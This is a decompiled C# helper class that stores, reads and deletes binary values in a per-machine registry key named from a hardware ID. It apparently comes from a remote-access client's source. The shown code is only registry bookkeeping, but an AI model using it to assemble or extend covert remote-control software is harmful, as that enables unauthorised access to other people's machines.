using System;
using Client.Handle_Packet;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x0200000E RID: 14
	public static class SetRegistry
	{
		// Token: 0x06000041 RID: 65 RVA: 0x00003C28 File Offset: 0x00001E28
		public static bool SetValue(string name, byte[] value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					registryKey.SetValue(name, value, RegistryValueKind.Binary);
					return true;
				}
			}
			catch (Exception ex)
			{
				Packet.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00003C94 File Offset: 0x00001E94
		public static byte[] GetValue(string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
				{
					return (byte[])registryKey.GetValue(value);
				}
			}
			catch (Exception ex)
			{
				Packet.Error(ex.Message);
			}
			return null;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00003D00 File Offset: 0x00001F00
		public static bool DeleteValue(string name)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
				{
					registryKey.DeleteValue(name);
					return true;
				}
			}
			catch (Exception ex)
			{
				Packet.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00003D68 File Offset: 0x00001F68
		public static bool DeleteSubKey()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("", true))
				{
					registryKey.DeleteSubKeyTree(SetRegistry.ID);
					return true;
				}
			}
			catch (Exception ex)
			{
				Packet.Error(ex.Message);
			}
			return false;
		}

		// Token: 0x04000023 RID: 35
		private static readonly string ID = "Software\\" + Settings.Hwid;
	}
}
